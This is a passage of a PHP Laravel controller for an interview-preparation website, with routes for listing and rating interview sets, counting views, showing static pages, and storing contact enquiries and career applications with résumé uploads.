<?php
namespace App\Http\Controllers\Front;
use Illuminate\Http\Request;
use App\Http\Requests;
use App\Http\Controllers\Controller;
use App\Models\MemberInterviewModel;
use App\Models\SkillsModel;
use App\Models\ContactEnquiryModel;
use App\Models\AccountSettingModel;
use App\Models\ManageEmailModel;
use App\Models\PriceListModel;
use App\Models\RealtimeExperienceModel;
use App\Models\VisitorsModel;
use App\Models\UserAlertsModel;
use App\Models\UserModel;
use App\Models\StaticPageModel; 
use App\Models\CareerModel;
use App\Models\CategoryModel;
use App\Models\TransactionModel;
use App\Models\ReviewRatingModel;
use App\Models\QualificationModel;
use App\Models\SpecializationModel;
use App\Models\MultiReferenceBookModel;
use App\Models\InterviewDetailModel;
use App\Models\CompanyModel;
use App\Models\TrainingCurriculamModel;
use App\Models\TrainingSchedulesModel;

use Validator;
use Sentinel;
use Session;
use Mail;
use Activation;
use URL;
use Flash;
use File;


class HomeController extends Controller
{

    public function __construct(MemberInterviewModel $memberinterview,
                                SkillsModel $skills,
                                ContactEnquiryModel $contact_enquiry,
                                AccountSettingModel $account_setting,
                                ManageEmailModel $manage_email,
                                PriceListModel $price_list,
                                RealtimeExperienceModel $real_time_experience,
                                VisitorsModel $visitors,
                                UserAlertsModel $user_alerts,
                                userModel $user,   
                                StaticPageModel $static_page,
                                CareerModel $career_model,
                                CategoryModel $category,
                                QualificationModel $qualification,
                                TransactionModel $transaction,
                                SpecializationModel $specialization,
                                ReviewRatingModel $review_rating,
                                MultiReferenceBookModel $multiple_reference_book,
                                InterviewDetailModel $interview_detail,
                                CompanyModel $company,
                                TrainingCurriculamModel $curriculam,
                                TrainingSchedulesModel $schedule

                                )
    {
        $this->arr_view_data           = [];
        $this->UserModel               = $user;
        $this->MemberInterviewModel    = $memberinterview;
        $this->RealtimeExperienceModel = $real_time_experience;
        $this->SkillsModel             = $skills;
        $this->ContactEnquiryModel     = $contact_enquiry;
        $this->ManageEmailModel        = $manage_email;
        $this->AccountSettingModel     = $account_setting;
        $this->CategoryModel           = $category;
        $this->TransactionModel        = $transaction;
        $this->ReviewRatingModel       = $review_rating;
        $this->QualificationModel      = $qualification;
        $this->SpecializationModel     = $specialization;
        $this->PriceListModel          = $price_list;
        $this->UserAlertsModel         = $user_alerts;
        $this->StaticPageModel         = $static_page;
        $this->CareerModel             = $career_model;
        $this->InterviewDetailModel    = $interview_detail;
        $this->TrainingCurriculamModel = $curriculam;
        $this->TrainingSchedulesModel  = $schedule;
        $this->CompanyModel    = $company;
        $this->BaseModel               = Sentinel::createModel();   // using sentinel for base model.
        $this->VisitorsModel           = $visitors;
        $this->MultiReferenceBookModel = $multiple_reference_book;
        $this->ip_address              = isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:false;
        $this->user_profile_public_img_path = url('/').config('app.project.img_path.user_profile_image');
         
        $this->member_interviewimages_public_path = url('/').config('app.project.img_path.interview_images');
        $this->member_interviewimages_path  = public_path().config('app.project.img_path.interview_images');
        
        $this->career_resume_path    = public_path().config('app.project.img_path.career_resume');
    }   

    public function index()
    {   
        $obj_interview = $this->MemberInterviewModel
                              ->with(['user_purchase_details'=>function($query)
                              {
                                $query->where('payment_status','paid');
                              },'average_rating'=>function($query)
                                {
                                   $query->where('approve_status','both')
                                         ->orWhere('approve_status','user'); 
                                }     
                                ])
                              ->where('admin_approval',1)
                              ->where('is_active',1)
                              ->orderBy('publish_date','desc')
                              ->take(7)
                              ->get();
        $arr_interview=[];                                                    
        if($obj_interview)
        {
            $arr_interview = $obj_interview->toArray();
        } 
        foreach($arr_interview as $key => $data) 
        {   
            $i=0;
            $count_rating   = 0;
            $arr_interview[$key]['average_star']=0;
            if(isset($data['average_rating']) && sizeof($data['average_rating'])>0)
            {
                foreach ($data['average_rating'] as $rating) 
                {
                    $i++;
                    $rating = $rating['review_star'];
                    $count_rating = round($count_rating+$rating);            
                }
                $arr_interview[$key]['average_star'] = $count_rating/$i;
            }
        }
         
        $obj_price_list = $this->PriceListModel->get();
        if($obj_price_list)
        {
            $arr_price_list = $obj_price_list->toArray();
        }
        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }
        $skill_name='';

        //Register User Count
        $arr_user_count = $this->BaseModel->whereHas('roles',function($query)
                                        {
                                            $query->where('slug','!=','admin');        
                                            $query->where('slug','!=','member');
                                        })
                                        ->count();
        // Register Member Count
        $arr_member_count = $this->BaseModel->whereHas('roles',function($query)
                                              {
                                                $query->where('slug','!=','admin');
                                                $query->where('slug','!=','user');  
                                              })
                                            ->count();
        // Interview approve and Tickets Count
        $multi_ref_book = $this->MultiReferenceBookModel    
                            ->where('approve_status','=','1')
                            ->count();  

        $company        = $this->InterviewDetailModel    
                            ->where('approve_status','=','1')
                            ->count();                                  

        $real_time_exp_approve = $this->RealtimeExperienceModel    
                            ->where('approve_status','=','1')
                            ->count();    

        $count_approve   =  $multi_ref_book + $company + $real_time_exp_approve;     

        $obj_category = $this->CategoryModel->get();
        if($obj_category)
        {
            $arr_category = $obj_category->toArray();
        }

        
        $obj_skills = $this->SkillsModel->get();
        if($obj_skills)
        {
            $arr_skills = $obj_skills->toArray();
        }
        $obj_qualification = $this->QualificationModel->get();
        if($obj_qualification)
        {
            $arr_qualification = $obj_qualification->toArray();
        }
        $obj_specialization = $this->SpecializationModel->get();
        if($obj_specialization)
        {
            $arr_specialization = $obj_specialization->toArray();
        }
        $obj_company = $this->CompanyModel->get();
        if($obj_company)
        {
            $arr_company = $obj_company->toArray();
        }
        //dd($arr_skill);
    
        $this->arr_view_data['arr_category']       = $arr_category;
        $this->arr_view_data['arr_qualification']  = $arr_qualification;
        $this->arr_view_data['arr_specialization'] = $arr_specialization;
        $this->arr_view_data['arr_skills']         = $arr_skills;
        $this->arr_view_data['arr_interview']      = $arr_interview;
        $this->arr_view_data['arr_skill']          = $arr_skill;
        $this->arr_view_data['arr_price']          = $arr_price_list;
        $this->arr_view_data['skill_name']         = $skill_name;
        $this->arr_view_data['arr_user_count']     = $arr_user_count;
        $this->arr_view_data['arr_member_count']   = $arr_member_count;
        $this->arr_view_data['count_approve']      = $count_approve;
        $this->arr_view_data['arr_company']        = $arr_company;

        $this->arr_view_data['interview_images_public_path'] = $this->member_interviewimages_public_path;
        $this->arr_view_data['member_interviewimages_path'] = $this->member_interviewimages_path;
        return view('front.home',$this->arr_view_data);
    }

    public function view_all()
    {
        /*$obj_interview = $this->MemberInterviewModel
                              ->with(['user_purchase_details',
                                 'average_rating'=>function($query)
                                {
                                   $query->where('approve_status','!=','member');
                                   $query->with(['user_details']);
                                }     
                                ])    
                              ->where('admin_approval',1)
                              ->where('is_active',1)  
                              ->paginate(5);  
        */

        $obj_interview = $this->MemberInterviewModel
                              ->with(['user_purchase_details'=>function($query)
                              {
                                $query->where('payment_status','paid');
                              },'average_rating'=>function($query)
                                {
                                   $query->where('approve_status','both')
                                         ->orWhere('approve_status','user'); 
                                }     
                                ])
                              ->where('admin_approval',1)
                              ->where('is_active',1)
                              ->orderBy('publish_date','desc')
                              ->paginate(7);                        

        if($obj_interview)
        {
            $arr_pagination = clone $obj_interview;  
            $arr_interview = $obj_interview->toArray();
        } 
        foreach($arr_interview['data'] as $key => $data) 
        {   
            $i=0;
            $count_rating   = 0;
            $arr_interview[$key]['average_star']=0;
            if(isset($data['average_rating']) && sizeof($data['average_rating'])>0)
            {
                foreach ($data['average_rating'] as $rating) 
                {
                    $i++;
                    $rating = $rating['review_star'];
                    $count_rating = round($count_rating+$rating);            
                }
                $arr_interview[$key]['average_star'] = $count_rating/$i;
            }
        }

        /*$arr_tmp_interview = [];
        //dd($arr_interview);
        $count_rating   = 0;
        $average_rating = 0;*/
        /*foreach($arr_interview['data']  as $key => $skill) 
        {
            $obj_interview_skill = $this->MemberInterviewModel
                                            ->where('user_id',$skill['user_id'])
                                            ->where('skill_id',$skill['skill_id'])
                                            ->where('experience_level',$skill['experience_level'])->get();
            $arr_interview['data'][$key]['interview_skills'] = $obj_interview_skill->toArray();
            $arr_interview['data'][$key]['user_purchase_count'] = count($skill['user_purchase_details']);

            $average_rating = 0;
          
           $arr_interview['data'][$key]['rating_average_count']=0;
           if(count($skill['average_rating'])>0)
           {   
                 $count_reviewed_users = count($skill['average_rating']);
                foreach ($skill['average_rating'] as  $data) 
                { 
                    $rating=$data['review_star'];
                    $count_rating = $count_rating+$rating; 
                }  

             $average_rating = round($count_rating/$count_reviewed_users); 
              
           }
           $arr_interview['data'][$key]['rating_average_count'] = $average_rating;
                         
        }*/
        
       /// dd($arr_interview['data']);
        

        //dd($arr_interview['data']);
        /*foreach($arr_interview['data']  as $key1 => $view) 
        {
            $boj_interview_view = $this->VisitorsModel
                                       ->where('user_id',$view['user_id'])
                                       ->where('skill_id',$view['skill_id'])
                                       ->count(); 
            $arr_interview['data'][$key1]['interview_view_count'] = $boj_interview_view;                           
        }*/

        //dd($arr_interview['data']);
        $obj_price_list = $this->PriceListModel->get();
        if($obj_price_list)
        {
            $arr_price_list = $obj_price_list->toArray();
        }
        /*dd($arr_price_list);*/
        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }
        $skill_name='';

        //Register User Count
         $arr_user_count = $this->BaseModel->whereHas('roles',function($query)
                                        {
                                            $query->where('slug','!=','admin');        
                                            $query->where('slug','!=','member');
                                        })
                                        ->count();

        // Register Member Count
         $arr_member_count = $this->BaseModel->whereHas('roles',function($query)
                                              {
                                                $query->where('slug','!=','admin');
                                                $query->where('slug','!=','user');  
                                              })
                                            ->count();                           
        // Interview approve and Tickets Count
         $member_interview_approve = $this->MemberInterviewModel    
                            ->where('approve_status','=','1')
                            ->count();  

         $real_time_exp_approve = $this->RealtimeExperienceModel    
                            ->where('approve_status','=','1')
                            ->count();    

         $count_approve   =  $member_interview_approve + $real_time_exp_approve;     

        $this->arr_view_data['arr_interview']  = $arr_interview;
        $this->arr_view_data['arr_pagination']        = $arr_pagination; 
        $this->arr_view_data['arr_interview']         = $arr_interview;
        $this->arr_view_data['arr_skill']             = $arr_skill;
        $this->arr_view_data['arr_price']             = $arr_price_list;
        $this->arr_view_data['skill_name']            = $skill_name;
        $this->arr_view_data['arr_user_count']        = $arr_user_count;
        $this->arr_view_data['arr_member_count']      = $arr_member_count;
        $this->arr_view_data['count_approve']         = $count_approve;  

        $this->arr_view_data['interview_images_public_path'] = $this->member_interviewimages_public_path;
        $this->arr_view_data['member_interviewimages_path'] = $this->member_interviewimages_path;
        return view('front.view_all',$this->arr_view_data);
    }

    public function searchskill(Request $request)
    {   
        $arr_interview = [];
        $skill_id    = $request->input('skill_id');
        
        $obj_interview = $this->MemberInterviewModel->where('skill_id',$skill_id)
                                                    ->with(['user_purchase_details',
                                                     'average_rating'=>function($query)
                                                    {
                                                        $query->where('approve_status','!=','member');
                                                       $query->with(['user_details']);
                                                    }     
                                                    ])   
                                                    ->where('admin_approval',1)
                                                    ->where('is_active',1)
                                                    ->orderBy('publish_date','desc')
                                                    ->get();
                                                    
        if($obj_interview)
        {
            $arr_interview  = $obj_interview->toArray();
        }

        //dd($arr_interview);
        $count_rating   = 0;
        $average_rating = 0;
        foreach ($arr_interview as $key => $details) 
        {
           $arr_interview[$key]['user_purchase_count'] = count($details['user_purchase_details']); 

           $average_rating = 0;
          
           $arr_interview[$key]['rating_average_count']=0;
           if(count($details['average_rating'])>0)
           {   
                 $count_reviewed_users = count($details['average_rating']);
                foreach ($details['average_rating'] as  $data) 
                { 
                    $rating=$data['review_star'];
                    $count_rating = $count_rating+$rating; 
                }  

             $average_rating = round($count_rating/$count_reviewed_users); 
              
           }
           $arr_interview[$key]['rating_average_count'] = $average_rating;

        }                                                    
       
       // dd($arr_interview);

        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }

        $obj_price_list = $this->PriceListModel->get();
        if($obj_price_list)
        {
            $arr_price_list = $obj_price_list->toArray();
        }

        $obj_category = $this->CategoryModel->get();
        if($obj_category)
        {
            $arr_category = $obj_category->toArray();
        }
        $obj_skills = $this->SkillsModel->get();
        if($obj_skills)
        {
            $arr_skills = $obj_skills->toArray();
        }
        $obj_qualification = $this->QualificationModel->get();
        if($obj_qualification)
        {
            $arr_qualification = $obj_qualification->toArray();
        }
        $obj_specialization = $this->SpecializationModel->get();
        if($obj_specialization)
        {
            $arr_specialization = $obj_specialization->toArray();
        }
        $obj_company = $this->CompanyModel->get();
        if($obj_company)
        {
            $arr_company = $obj_company->toArray();
        }


         //Register User Count
        $arr_user_count = $this->BaseModel->whereHas('roles',function($query)
                                        {
                                            $query->where('slug','!=','admin');        
                                            $query->where('slug','!=','member');
                                        })
                                        ->count();

        // Register Member Count
          $arr_member_count = $this->BaseModel->whereHas('roles',function($query)
                                              {
                                                $query->where('slug','!=','admin');
                                                $query->where('slug','!=','user');  
                                              })
                                            ->count();                           
        // Interview approve and Tickets Count
         $member_interview_approve = $this->MemberInterviewModel    
                            ->where('approve_status','=','1')
                            ->count();  

         $real_time_exp_approve = $this->RealtimeExperienceModel    
                            ->where('approve_status','=','1')
                            ->count();    

         $count_approve   =  $member_interview_approve + $real_time_exp_approve;     

        $this->arr_view_data['arr_category']       = $arr_category;
        $this->arr_view_data['arr_qualification']  = $arr_qualification;
        $this->arr_view_data['arr_specialization'] = $arr_specialization;
        $this->arr_view_data['arr_skills']         = $arr_skills;
        $this->arr_view_data['arr_company']        = $arr_company;
        $this->arr_view_data['arr_price']             = $arr_price_list;
        $this->arr_view_data['arr_interview']         = $arr_interview;
        $this->arr_view_data['arr_skill']             = $arr_skill;
        $this->arr_view_data['skill_name']            = $skill_id;
        $this->arr_view_data['arr_user_count']        = $arr_user_count;
        $this->arr_view_data['arr_member_count']      = $arr_member_count;
        $this->arr_view_data['count_approve']         = $count_approve; 
        $this->arr_view_data['interview_images_public_path']= $this->member_interviewimages_public_path;
        $this->arr_view_data['member_interviewimages_path'] = $this->member_interviewimages_path;
        return view('front.home',$this->arr_view_data);
    }
    public function freePreview($enc_id,$type,$skill,$exp)
    {

        $id         = base64_decode($enc_id);
        $learn_type = $type;
		$arr_book = [];
        $book  = $this->MultiReferenceBookModel    
                            ->where('id','=',$id)->first();
		$filename=$book->mul_reference_book;
		$interviewId=$book->interview_id;
		$topicName=$book->topic_name;
		
        $this->arr_view_data['filename']        = $filename;  
        $this->arr_view_data['interviewId']        = $interviewId;  
        $this->arr_view_data['topicName']        = $topicName;  
      
        if($learn_type == 'referencebook')
        {
           $this->arr_view_data['module_title']      = base64_decode($skill) . "Real Time Interview Questions &amp; Answers ( ".base64_decode($exp)." Year Exp )"; 
		   $this->arr_view_data['book']      = "Book"; 
		   return view('front.freePreview',$this->arr_view_data);
        }
        elseif($learn_type == 'company')
        {
            $this->arr_view_data['module_title']      = 'Companies';
            return view('front.freePreview',$this->arr_view_data);
        }
        elseif($learn_type == 'rwe_tickets')
        {
            $this->arr_view_data['module_title']      = base64_decode($skill) . "Real Time Interview Questions &amp; Answers ( ".base64_decode($exp)." Year Exp )"; 
			$this->arr_view_data['id']      = $id; 
			$this->arr_view_data['book']      = "Real"; 
            return view('front.freePreview',$this->arr_view_data);
        }
		return view('front.freePreview');
	}
    public function interview_details($interview_id)
    {
        $interview_id  = base64_decode($interview_id);

        $obj_review_rating = $this->ReviewRatingModel->where('interview_id',$interview_id)
                                                     ->where('approve_status','user')
                                                     ->orWhere('approve_status','both')
                                                     ->with(['user_details'])   
                                                     ->get();
            $count_rating   = 0;
            $average_rating = 0;
           
        $arr_review_rating = [];
        if(isset($obj_review_rating) && sizeof($obj_review_rating)>0)
        { 
            $arr_review_rating = $obj_review_rating->toArray();
            
            $count_reviewed_users = count($arr_review_rating);
            
            foreach ($arr_review_rating as $key => $data) 
            {
                $rating=$data['review_star'];
                $count_rating = $count_rating+$rating; 
            }
            $average_rating = round($count_rating/$count_reviewed_users); 
        }                                         
        
                
        $obj_interview = $this->MemberInterviewModel->where('id',$interview_id)
                                                    ->with(['interview_details'=> function ($interview)
                                                    {
                                                        $interview
                                                        ->where('approve_status',1); 
                                                    }
                                                    ,'reference_book_details'=> function ($reference_book)
                                                    {
                                                        $reference_book
                                                        ->where('approve_status',1); 
                                                    },'memberdetails','user_purchase_details'])
                                                    ->first();

                                            
        $arr_interview=[];                                            
        if($obj_interview)
        {
            $arr_interview = $obj_interview->toArray();
        }

        $video_id = "";
        if($arr_interview['video'] !='')
        {
            $video_url = $arr_interview['video'];
            $video_id = explode("?v=", $video_url);
            $video_id = $video_id[1];

        }
        $arr_interview['video_id'] = $video_id;
        //dd($arr_interview);
        $obj_realtime = $this->MemberInterviewModel->where('id',$interview_id)
                                                   ->with(['realtime_details'=> function ($realtime)
                                                    {
                                                        $realtime
                                                        ->where('approve_status',1);
                                                    }
                                                    ])->first();     
        $arr_realtime=[];                                            
        if($obj_realtime)
        {
            $arr_realtime = $obj_realtime->toArray();
        }                                           
        /*dd($arr_realtime);*/
        $experience_level = @$arr_interview['experience_level'];
        $skill_id = @$arr_interview['skill_id'];
        $user_id = @$arr_interview['user_id'];
        $member_id = @$arr_interview['member_id'];
        $skill_name = @$arr_interview['skill_name'];
        
        $interview_id=@$arr_interview['id'];
        $arr_company_name = array();
        $arr_final_result = array();
        if(sizeof($arr_interview)>0)
        {
            if (isset($arr_interview['interview_details']) && sizeof($arr_interview['interview_details'])>0) 
            {
                    foreach ($arr_interview['interview_details'] as $key => $company_details) 
                    {
                        $arr_company_name[$key]['company_name'] = $company_details['company_name'];
                        $arr_company_name[$key]['company_id'] = $company_details['company_id'];
                    }

                    if (isset($arr_company_name) && sizeof($arr_company_name)>0)
                    {
                        foreach ($arr_company_name as $key => $company_value) 
                        {
                            $current_count = 0;
                            $current_id = $company_value['company_id'];

                            foreach ($arr_company_name as $sdkey => $count_value) 
                            {
                                if ($current_id==$count_value['company_id'])
                                {
                                    $current_count++;
                                }
                            }

                            $arr_final_result[$key]['company_name']  = $company_value['company_name'];
                            $arr_final_result[$key]['company_id']    = $company_value['company_id'];
                            $arr_final_result[$key]['company_count'] = $current_count;
                        }
                    }
            }
            
        }

        $company_details = array_map("unserialize", array_unique(array_map("serialize", $arr_final_result)));

       
        $this->arr_view_data['company_details'] = $company_details;
        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }
        $arr_user_details=[];
        $obj_user_details = $this->AccountSettingModel->get();
        if($obj_user_details)
        {
            $arr_user_details = $obj_user_details->toArray();
        }
        $arr_user_email=[];
        $obj_user_email = $this->ManageEmailModel->get();
        if($obj_user_email)
        {
            $arr_user_email = $obj_user_email->toArray();
        }

        /*--------------------------------------------------------------------------------
          start price list 
        --------------------------------------------------------------------------------*/
        $arr_price_list=[];
        $obj_price_list = $this->PriceListModel->where('exp_level',$experience_level)->first();
        if($obj_price_list)
        {
            $arr_price_list = $obj_price_list->toArray();
        } 


         /*--------------------------------------------------------------------------------
          start Interview view count  
        --------------------------------------------------------------------------------*/

        $date = date("Y-m-d");
        $interview_viwes_exists = $this->VisitorsModel->where('ip_address','=',$this->ip_address) 
                                                      ->where('interview_id',$interview_id)  
                                                      ->where('date','=',$date)
                                                      ->count();
        //dd($interview_viwes_exists);                                              
                                  
        if($interview_viwes_exists ==0)
        {
                $interview_views_data                 = [];
                $interview_views_data['user_id']      = $user_id;
                $interview_views_data['interview_id']     = $interview_id;
                $interview_views_data['ip_address']   = $this->ip_address;
                $interview_views_data['date']         = date("Y-m-d");

                //dd($interview_views_data);
                $views = $this->VisitorsModel->create($interview_views_data);
                $obj_count = $this->MemberInterviewModel->where('id',$interview_id)->first(['view_count']);
                if($obj_count)
                {
                    $count = $obj_count->toArray();    
                }
               
                $view_count = $count['view_count'];
                $increment_count = $view_count+1;
                $result = $this->MemberInterviewModel->where('id',$interview_id)
                                                     ->update(['view_count'=>$increment_count]);
        }     



         /*--------------------------------------------------------------------------------
          end Interview view count  
        --------------------------------------------------------------------------------*/

         /*-------------------------------------------------------------------------
            start user who viewed this also viewed data 
        -------------------------------------------------------------------------*/
        $arr_other_interview = [];        
        $obj_other_interview = $this->MemberInterviewModel->where('skill_id',$skill_id)
                                                          ->get();
        if($obj_other_interview)
        {
            $arr_other_interview = $obj_other_interview->toArray();
        }                                                    


        
        foreach($arr_other_interview  as $key => $skill) 
        {
            $obj_other_interview_skill = $this->MemberInterviewModel
                                            ->where('user_id',$skill['user_id'])
                                            ->where('skill_id',$skill['skill_id'])
                                            ->where('experience_level',$skill['experience_level'])->get();
            $arr_other_interview[$key]['interview_skills'] = $obj_other_interview_skill->toArray();
        }

        $arr_training_curriculam = '';
        $obj_training_curriculam = $this->TrainingCurriculamModel->where(['skill_id'=>$skill_id, 'member_id'=>$member_id])->get();
        if($obj_training_curriculam)
        {
            $arr_training_curriculam = $obj_training_curriculam->toArray();
        }

        $obj_user_info = $this->UserModel->where(['id'=>$user_id])->get();
        if($obj_user_info)
        {
            $arr_user_info = $obj_user_info->toArray();
        }


        $arr_training_schedule = '';
        $obj_training_schedule = $this->TrainingSchedulesModel->where(['skill_id'=>$skill_id, 'member_id'=>$member_id])->first();
        if($obj_training_schedule)
        {
            $arr_training_schedule = $obj_training_schedule->toArray();
        }

        /*------------------------------------------------------------------------------
            end also viewed
          ----------------------------------------------------------------------------*/
        
        $this->arr_view_data['video_id']                     = $video_id;
        
        $this->arr_view_data['arr_otherinterview']           = $arr_other_interview;
        $this->arr_view_data['arr_realtime']                 = $arr_realtime;
        $this->arr_view_data['arr_interview']                = $arr_interview;
        $this->arr_view_data['arr_skill']                    = $arr_skill;
        $this->arr_view_data['arr_user_info']                = $arr_user_info;
        $this->arr_view_data['arr_training_curriculam']      = $arr_training_curriculam;
        $this->arr_view_data['arr_training_schedule']        = $arr_training_schedule;
        $this->arr_view_data['arr_user_details']             = $arr_user_details;
        $this->arr_view_data['arr_user_email']               = $arr_user_email;
        $this->arr_view_data['arr_price_list']               = $arr_price_list;
        $this->arr_view_data['experience_level']             = $experience_level;
        $this->arr_view_data['skill_id']                     = $skill_id;
        $this->arr_view_data['user_id']                      = $user_id;
        $this->arr_view_data['member_id']                    = $member_id;
        $this->arr_view_data['interview_id']                 = $interview_id;
        $this->arr_view_data['skill_name']                   = $skill_name;
        $this->arr_view_data['arr_review_rating']            = $arr_review_rating;
        $this->arr_view_data['user_profile_public_img_path'] = $this->user_profile_public_img_path;
        $this->arr_view_data['average_rating']               = $average_rating;
        /*dd($arr_interview);*/
        return view('front.member.interview-detail',$this->arr_view_data);
    }

    
    public function about_us()
    {
        $arr_aboutus =[];
        $obj_aboutus = $this->StaticPageModel
                                 ->where('id','34')
                                 ->where('is_active',1)
                                 ->first();
        if($obj_aboutus)
        {
            $arr_aboutus = $obj_aboutus->toArray();
        } 
        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }
        $skill_name='';

        $this->arr_view_data['arr_skill']         = $arr_skill;
        $this->arr_view_data['skill_name']        = $skill_name;
        $this->arr_view_data['page_title']        = "About Us";
        $this->arr_view_data['arr_data']          = $arr_aboutus;
        return view('front.about_us',$this->arr_view_data);    
    }

    public function terms_of_use()
    {
        $arr_terms_of_use =[];
        $obj_terms_of_use = $this->StaticPageModel
                                 ->where('id','39')
                                 ->where('is_active',1)
                                 ->first();
        if($obj_terms_of_use)
        {
            $arr_terms_of_use = $obj_terms_of_use->toArray();
        }

        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }
        $skill_name='';

        $this->arr_view_data['arr_skill']             = $arr_skill;
        $this->arr_view_data['skill_name']             = $skill_name;
        $this->arr_view_data['page_title']        = "Terms of Use";
        $this->arr_view_data['arr_data']          = $arr_terms_of_use;
        return view('front.common',$this->arr_view_data);
    }

    public function privacy_policy()
    {
        $arr_privacy_policy =[];
        $obj_privacy_policy = $this->StaticPageModel
                                 ->where('id','40')
                                 ->where('is_active',1)
                                 ->first();
        if($obj_privacy_policy)
        {
            $arr_privacy_policy = $obj_privacy_policy->toArray();
        } 

        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }
        $skill_name='';

        $this->arr_view_data['arr_skill']             = $arr_skill;
        $this->arr_view_data['skill_name']             = $skill_name;
        $this->arr_view_data['page_title']        = "Privacy Policy";
        $this->arr_view_data['arr_data']          = $arr_privacy_policy;
        return view('front.common',$this->arr_view_data);
    }

    public function contact_us()
    {
        $arr_account_setting = [];
        $obj_account_setting = $this->AccountSettingModel->first();
        if($obj_account_setting)
        {    
            $arr_account_setting = $obj_account_setting->toArray();
        }

        $arr_email = [];
        $obj_email = $this->ManageEmailModel->first();
        if($obj_email)
        {
            $arr_email = $obj_email->toArray();
        } 

        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }
        $skill_name='';

        $this->arr_view_data['arr_skill']             = $arr_skill;
        $this->arr_view_data['skill_name']             = $skill_name;   
        $this->arr_view_data['arr_account_detail'] = $arr_account_setting;
        $this->arr_view_data['arr_email'] = $arr_email;

        return view('front.contact_us',$this->arr_view_data);    
    }

    public function store_contact_enquiry(Request $request)
    {
        $arr_rules['name']    = "required";
        $arr_rules['email']   = "required";
        $arr_rules['message'] = "required";
        $arr_rules['mob_no']  = "required";

        $validator            = Validator::make($request->all(),$arr_rules);

        if($validator->fails())
        {
          return redirect()->back()->withErrors($validator)->withInput($request->all());
        }
        
        $contact_us_data              = [];
        $contact_us_data['user_name'] = $request->input('name');
        $contact_us_data['email']     = $request->input('email');
        $contact_us_data['phone']     = $request->input('mob_no');
        $contact_us_data['message']   = $request->input('message');

        $contact_us = $this->ContactEnquiryModel->create($contact_us_data);
        if($contact_us)
        {
            Flash::success('Your request has been sent successfully.');
        }    
        else
        {
            Flash::error('Error while sending your request');
        }
        return redirect()->back();
    }

    public function careers()
    {
        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }
        $skill_name='';

        $this->arr_view_data['arr_skill']             = $arr_skill;
        $this->arr_view_data['skill_name']             = $skill_name;
        return view('front.career',$this->arr_view_data);    
    }

    public function careers_form($career_slug)
    {
        $this->arr_view_data['career_slug']  = $career_slug;
        return view('front.career-form',$this->arr_view_data);   
    }

    public function store_careers(Request $request)
    {
        $arr_rules['first_name']            = "required";
        $arr_rules['last_name']             = "required";
        $arr_rules['job_title']             = "required";
        $arr_rules['total_exp_year']        = "required";
        $arr_rules['total_exp_month']       = "required";
        $arr_rules['company_name']          = "required";
        $arr_rules['employer_type']         = "required";
        $arr_rules['duration_month_start']  = "required";
        $arr_rules['duration_year_start']   = "required";
        $arr_rules['duration_month_end']    = "required";
        $arr_rules['duration_year_end']     = "required";
        $arr_rules['designation']           = "required";
        $arr_rules['annual_sal']            = "required";
        $arr_rules['current_location']      = "required";    
        $arr_rules['mobile_no']             = "required"; 
        $arr_rules['date']                  = "required";
        $arr_rules['month']                 = "required";
        $arr_rules['year']                  = "required";   
        $arr_rules['gender']                = "required";         
        $arr_rules['email']                 = "required";   

        $validator            = Validator::make($request->all(),$arr_rules);

        if($validator->fails())
        {
          return redirect()->back()->withErrors($validator)->withInput($request->all());
        }

        $file_name ='';
         if($request->hasFile('resume'))
        {   

            $bytes = File::size($request->file('resume'));
            $fileExtension = strtolower($request->file('resume')->getClientOriginalExtension()); 

            $arr_file_types = ['docx','pdf','doc','rtf'];

            //if(in_array($fileExtension, $arr_file_types) && $bytes<=500000)
            if(in_array($fileExtension, $arr_file_types))    
            {
                if($bytes<=500000)
                {
                    $file_name      = $request->input('resume');
                    $file_extension = strtolower($request->file('resume')->getClientOriginalExtension()); 
                    $file_name      = sha1(uniqid().$file_name.uniqid()).'.'.$file_extension;
                    $request->file('resume')->move($this->career_resume_path, $file_name); 
                }
                else
                {
                    Flash::error('Please upload valid max size 500 kb');
                    return redirect()->back();
                } 
                
            }
            else
            {
                Flash::error('Please upload valid file with doc,docx,pdf,rtf extension.');
                return redirect()->back();
            } 
        }

        $date = $request->input('date');
        $month = $request->input('month');
        $year = $request->input('year');
        
        $birth_date=date('Y-m-d',strtotime($year.'-'.$month.'-'.$date)); 

        $arr_member_data = [];
        $arr_member_data['first_name']              = $request->input('first_name');
        $arr_member_data['last_name']               = $request->input('last_name');
        $arr_member_data['job_title']               = $request->input('job_title');
        $arr_member_data['experience_years']        = $request->input('total_exp_year');
        $arr_member_data['experience_month']        = $request->input('total_exp_month');
        $arr_member_data['company_name']            = $request->input('company_name');
        $arr_member_data['employer_type']           = $request->input('employer_type');
        $arr_member_data['employer_name']           = $request->input('employer_name');
        $arr_member_data['start_month']             = $request->input('duration_month_start');
        $arr_member_data['start_year']              = $request->input('duration_year_start');
        $arr_member_data['end_month']               = $request->input('duration_month_end');
        $arr_member_data['end_year']                = $request->input('duration_year_end');
        $arr_member_data['designation']             = $request->input('designation');
        $arr_member_data['annual_salary']           = $request->input('annual_sal');
        $arr_member_data['current_work_location']   = $request->input('current_location');
        $arr_member_data['mobile_code']             = $request->input('mobile_code');
        $arr_member_data['mobile_no']               = $request->input('mobile_no');
        $arr_member_data['birth_date']               = $birth_date;
        $arr_member_data['gender']                  = $request->input('gender');
        $arr_member_data['slug']                    = $request->input('carrer_slug');
        $arr_member_data['email']                   = $request->input('email');
        $arr_member_data['resume']                  = $file_name;

        $result = $this->CareerModel->create($arr_member_data);
